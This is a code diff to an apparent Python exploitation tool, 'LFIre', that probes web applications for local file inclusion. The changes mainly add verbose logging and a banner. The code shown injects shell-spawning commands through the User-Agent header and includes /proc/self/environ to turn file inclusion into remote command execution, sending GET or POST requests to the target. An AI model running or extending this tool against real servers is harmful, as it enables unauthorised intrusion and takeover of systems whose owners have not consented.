@@ -7,11 +7,12 @@ from colorama import Fore , Style
 import sys
 import subprocess
 import time
+import os
 
 MAX_DEPTH = 10
 	
 #description of the tool
-tool_description = ""	#to be filled
+tool_description = ''	#to be filled
 parser = argparse.ArgumentParser(description = tool_description)
 
 parser.add_argument("METHOD" , help="specify whether to use GET/POST request")
@@ -116,18 +117,22 @@ def check_shell(data , sled):
 	for current_file in shell_spawner_files:
 		target_file = data.replace("*" , (sled + current_file))
 		if test_url(target_file , shell_spawner_files[current_file]) == True:
+			if arguments.v:
+				print("[+]Shell can be spawned using the target file: " + target_file)
 			spawn_shell(target_file , sled , current_file)
 		else:
 			print(Fore.RED + "[-]Shell can't be spawned using " + target_file)
 
 def spawn_shell(data , sled , spawner_file):
-	open_shell()
-	for commands in spawn_commands:
-		if spawner_file == "proc/self/environ":
+	if spawner_file == "proc/self/environ":
+		for commands in spawn_commands:
+			open_shell()
 			header = headers
 			header.update({
 				"User-Agent" : commands
 			})
+			if arguments.v:
+				print(Fore.BLUE + "[+]Trying payload: " + commands + Style.RESET_ALL)
 			if arguments.METHOD.lower() == "get":
 				response = requests.get(data , proxies = proxy , headers = header)
 			elif arguments.METHOD.lower() == "post":
@@ -179,9 +184,11 @@ def using_post_request():
 		index_to_be_injected = params.find("*")		#find() returns the index of the character if present
 		
 		if index_to_be_injected >= 0:				#if injection point('*') is present
-			print("[+]Found injection point in parameters")
+			if arguments.v:
+				print("[+]Found injection point in parameters")
 			if params[index_to_be_injected - 1] == "=":	#if '=' is placed before '*'
-				print("[+]parameter seems to be valid")
+				if arguments.v:
+					print("[+]parameter seems to be valid")
 			else:
 				print(Fore.RED + "[-]Invalid Parameter(missing '=')")	#if '=' is missing before '*'
 				sys.exit()
@@ -215,6 +222,7 @@ def using_post_request():
 				LFI_FOUND = test_url(params , files[current_file])
 
 ###### MAIN ########
+os.system("figlet LFIre")
 if __name__ == "__main__":
 	if arguments.METHOD.lower() == "get":				#lower() for case insensitive comparision
 		using_get_request()
@@ -223,4 +231,4 @@ if __name__ == "__main__":
 		using_post_request()
 
 	else:
-		print(Fore.RED + "Invalid Method!")
+		print(Fore.RED + "Invalid Method!" + Style.RESET_ALL)
